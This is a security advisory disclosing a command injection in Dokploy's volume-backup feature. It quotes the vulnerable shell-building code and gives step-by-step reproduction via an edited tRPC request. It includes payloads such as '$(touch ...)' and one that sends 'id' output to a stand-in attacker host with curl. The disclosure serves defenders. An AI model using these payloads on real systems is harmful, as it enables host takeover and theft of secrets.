repo.description:
### Summary
An OS command injection vulnerability in the volume-backup feature allows any authenticated low-privilege member to execute arbitrary commands on the Dokploy control-plane host. The `volumeName` field of a volume backup is interpolated unquoted into a shell command that runs on the host with no input sanitisation. Because the Dokploy process holds the Docker socket, this is full host/root-equivalent compromise.

### Details
`volumeBackups.volumeName` is stored as a free-form `text()` column. Its Zod input schema is generated by `createInsertSchema` with no charset constraint - effectively a plain `z.string()`:

- `packages/server/src/db/schema/volume-backups.ts:25,116`
`createVolumeBackupSchema = createInsertSchema(volumeBackups).omit({ volumeBackupId: true })`

In `backupVolume`, the attacker-controlled `volumeName` (and `backupFileName`, which embeds it) is interpolated unquoted into a shell command string:

- `packages/server/src/utils/volume-backups/backup.ts:39,45,55,58`
```
  const backupFileName = `${volumeName}-${getBackupTimestamp()}.tar`;   // :39
  ...
  const backupCommand = `
      ...
      docker run --rm \
    -v ${volumeName}:/volume_data \                                     // :55
    -v ${volumeBackupPath}:/backup \
    ubuntu \
    bash -c "cd /volume_data && tar cvf /backup/${backupFileName} ."     // :58
  `;
```
  
`runVolumeBackup` then executes that string on the control-plane host:

- `packages/server/src/utils/volume-backups/utils.ts:103-122`
```
  const command = await backupVolume(volumeBackup);
  const commandWithLog = `(${command}) >> ${deployment.logPath} 2>&1`;
  if (serverId) { await execAsyncRemote(serverId, commandWithLog); }
  else          { await execAsync(commandWithLog); }
```

`execAsync` is `util.promisify(child_process.exec)`, which runs the string via `/bin/sh -c` (`packages/server/src/utils/process/execAsync.ts:10,17`). Any shell metacharacters in volumeName - e.g. `$(...)`, backticks, `;`, `|` - are therefore evaluated by the shell on the host.

### PoC
This can be reproduced entirely through the Dokploy web UI as a low-privilege member, using browser dev tools to bypass the form's client-side character restrictions. No special tooling is required.

1. Sign in as a user with the base member role who has access to at least one service.
2. Open the service and go to its Volume Backups section. Start creating a new volume backup.
3. The Volume Name field enforces client-side character restrictions, so the malicious value cannot be typed directly into the form. To get past this, the request is intercepted and modified after it leaves the form:
    - Open the browser Developer Tools -> Network tab.
    - Fill in the form with a benign, valid-looking volume name and submit it to create the backup, capturing the outgoing `volumeBackup.create` tRPC request.
    - Copy that request as a fetch/cURL (or use "Edit and Resend") and replace the volumeName value in the JSON body with a command-injection payload, for example:
`$(touch /etc/dokploy/RCE_PROOF)`
   - Then send the modified request. Because the server-side schema applies no charset validation, the payload is stored verbatim.
4. Back in the UI, trigger Run manually (`volumeBackup.runManually`) on the backup you just created - this is available to the same member role and executes immediately, with no need to wait for a cron schedule.
5. The injected `$(...)` payload is evaluated by `/bin/sh` on the Dokploy control-plane host when the backup command runs. Confirm execution by checking the marker file (e.g. `/etc/dokploy/RCE_PROOF`) on the host, or by using an out-of-band payload such as `$(curl http://attacker/$(id|base64))` and observing the callback.

The key point is that the client-side restriction on the Volume Name field is purely cosmetic: the server-side Zod schema (`createInsertSchema`, no charset constraint) accepts the raw value, and `runManually` is exposed to the member role, so a single intercepted-and-modified request followed by a UI button click achieves host command execution.

### Impact
Arbitrary command execution on the Dokploy control-plane host. Because the Dokploy process controls the Docker socket, code execution is host/root-equivalent. A low-privilege member of a single organization can therefore:

- Take over all organizations, projects, applications, and databases managed by the instance (multi-tenant breakout - CVSS Scope: Changed).
- Read or exfiltrate every stored secret, environment variable, and credential.
- Persist, pivot, or destroy infrastructure.

Anyone running a multi-tenant or multi-user Dokploy instance is impacted, as is any single-tenant deployment that grants the member role to semi-trusted users.
